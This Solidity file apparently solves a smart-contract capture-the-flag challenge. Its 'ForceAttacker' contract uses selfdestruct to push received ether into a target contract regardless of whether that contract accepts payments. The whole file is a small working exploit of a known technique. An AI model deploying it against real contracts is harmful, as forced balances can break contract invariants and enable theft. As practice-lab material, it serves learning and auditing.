pragma solidity ^0.8.21;

contract ForceAttacker {
    address payable public challengeAddress;

    constructor(address payable _challengeAddress) {
        challengeAddress = _challengeAddress;
    }

    function selfDestruct() external payable {
        require(msg.value > 0);
        // force send received ether to _challengeAddress via selfdestruct
        selfdestruct(challengeAddress);
    }
}
